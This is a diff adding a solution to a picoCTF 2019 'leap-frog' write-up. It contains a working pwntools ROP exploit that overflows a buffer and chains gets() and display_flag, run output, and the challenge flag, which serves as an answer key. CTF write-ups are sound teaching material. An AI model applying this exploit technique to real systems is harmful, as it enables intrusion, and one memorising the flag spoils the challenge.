@@ -2,7 +2,7 @@
 
 ## Challenge
 
-Can you jump your way to win in the following [program](https://2019shell1.picoctf.com/static/a7394c555b8cd0a7eac288c45367c49d/rop) and get the flag? You can find the program in /problems/leap-frog_1_2944cde4843abb6dfd6afa31b00c703c on the shell server? [Source](https://2019shell1.picoctf.com/static/a7394c555b8cd0a7eac288c45367c49d/rop.c).
+Can you jump your way to win in the following [program](https://2019shell1.picoctf.com/static/a7394c555b8cd0a7eac288c45367c49d/rop) and get the flag? You can find the program in /problems/leap-frog on the shell server? [Source](https://2019shell1.picoctf.com/static/a7394c555b8cd0a7eac288c45367c49d/rop.c).
 
 ## Hints
 
@@ -90,4 +90,58 @@ There are three corresponding functions which seem to set these booleans, but `l
 
 What if we just use the `gets()` function in Libc which is able to write anything from stdin into any writable segment of memory. So we can use `gets()` to set `win1`, `win2`, and `win3` to true, and skip calling all the `leap()` functions.
 
-TODO
+We can set all the variables to `true` with a payload that:
+
+    - Padding of A's for a Buffer Overflow
+    - gets_plt - first function to call
+    - flag_addr - second function to call
+    - win_addr - the buffer parameter being passed to gets
+
+```python
+from pwn import *
+import sys
+import subprocess
+
+BINARY = './rop'
+context.binary = BINARY
+context.terminal = ['tmux', 'splitw', '-v']
+
+if len(sys.argv) < 2:
+    stdout = process.PTY
+    stdin = process.PTY
+    sh = process(BINARY, stdout=stdout, stdin=stdin)
+    REMOTE = False
+else:
+    s = ssh(host='2019shell1.picoctf.com', user='samson', password="REDACTED")
+    sh = s.process('rop', cwd='/problems/leap-frog')
+    REMOTE = True
+
+gets_plt = 0x08048430
+win1_addr = 0x0804A03D
+display_flag_addr = 0x080486b3
+payload = 'A'*28
+payload += p32(gets_plt)
+payload += p32(display_flag_addr)
+payload += p32(win1_addr)
+sh.sendlineafter('> ', payload)
+sh.sendline('\x01\x01\x01')
+sh.interactive()
+```
+
+```bash
+samson@pico-2019-shell1:/problems/leap-frog$ python ~/test2.py 
+[*] '/problems/leap-frog/rop'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+[+] Starting local process './rop': pid 3016256
+[*] Switching to interactive mode
+picoCTF{h0p_r0p_t0p_y0uR_w4y_t0_v1ct0rY_f60266f9}
+[*] Got EOF while reading in interactive
+```
+
+## Flag
+
+`picoCTF{h0p_r0p_t0p_y0uR_w4y_t0_v1ct0rY_f60266f9}`
